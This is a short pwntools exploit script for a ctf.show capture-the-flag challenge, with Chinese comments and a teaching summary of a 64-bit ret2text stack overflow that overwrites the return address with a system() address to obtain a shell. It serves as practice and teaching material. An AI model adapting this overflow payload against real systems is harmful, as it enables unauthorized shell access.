from pwn import *

context(arch = 'amd64', os = 'linux', log_level = 'debug')

io = remote("pwn.challenge.ctf.show", 28303)
elf = ELF('./pwn')

# system_addr = 0x400672：system函数的地址
system_addr = 0x400672

# binsh = b"/bin/sh\x00"：/bin/sh字符串，用于system函数的参数
binsh = b"/bin/sh\x00"

# 等待提示信息
io.recvuntil(b" ***************************************** ")
io.recvuntil(b" ***************************************** ")
io.recvuntil(b" ***************************************** ")

# 构造payload，包含/bin/sh字符串和system函数地址
# payload = binsh：写入/bin/sh字符串
# payload = payload.ljust(0x2008, b"\x00")：填充到返回地址位置
# payload += p64(system_addr)：覆盖返回地址为system函数地址
payload = binsh
payload = payload.ljust(0x2008, b"\x00")
payload += p64(system_addr)

io.sendline(payload)

io.interactive()

"""
【知识点讲解】
1. 题目类型：ret2text - 64位栈溢出执行system函数
2. 核心原理：
   - 利用栈溢出漏洞覆盖返回地址
   - 跳转到system函数执行/bin/sh
3. 关键步骤：
   - 构造payload，包含/bin/sh字符串
   - 填充到返回地址位置
   - 覆盖返回地址为system函数地址
4. 执行流程：
   - 构造并发送payload -> 栈溢出覆盖返回地址 -> 执行system函数获取shell
5. 技术要点：
   - 64位栈溢出利用
   - system函数的调用
   - 字符串参数的传递
"""
